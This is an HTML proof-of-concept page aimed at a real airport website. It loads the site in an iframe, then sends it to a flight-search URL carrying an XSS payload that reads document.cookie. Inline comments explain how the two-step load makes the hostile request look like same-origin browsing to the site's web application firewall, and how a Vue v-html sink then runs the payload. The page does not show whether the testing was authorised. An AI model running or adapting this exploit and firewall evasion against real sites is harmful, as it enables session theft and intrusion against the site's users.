<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>iframe xss test</title>
  <style>
    body { font-family: monospace; padding: 20px; background: #111; color: #0f0; }
    #status { font-size: 14px; margin-bottom: 10px; padding: 8px; border: 1px solid #0f0; white-space: pre-wrap; }
    iframe { display: block; width: 100%; height: 700px; border: 2px solid #555; }
  </style>
</head>
<body>
  <div id="status">step 1: loading clean page...</div>

  <!--
    Step 1: load clean BA page (no payload) — WAF sees Sec-Fetch-Site: cross-site, no payload, allows it.
    Step 2: after onload, navigate the iframe to the XSS URL.
            The second request has Sec-Fetch-Site: same-origin + Referer: brusselsairport.be
            — looks like normal in-site navigation to the WAF.
    Step 3: Vue hydrates the XSS URL client-side → v-html sink fires.
  -->
  <iframe
    id="probe"
    src="https://www.brusselsairport.be"
    onload="handleLoad()"
  ></iframe>

  <script>
    var step = 1;

    function handleLoad() {
      var status = document.getElementById('status');

      if (step === 1) {
        status.textContent = 'step 1 done: clean page loaded.\nstep 2: navigating to XSS URL (now same-origin to WAF)...';
        step = 2;
        // Navigate the already-loaded iframe to the payload URL.
        // Referer will be brusselsairport.be, Sec-Fetch-Site: same-origin.
        document.getElementById('probe').contentWindow.location.href =
          'https://www.brusselsairport.be/en/passenger/flights/arriving?search=<img src=x onerror=alert(document.cookie)>';
      } else {
        status.textContent = 'step 2 done: payload page loaded.\ncheck visually — did BA render or WAF block page?';
      }
    }
  </script>
</body>
</html>
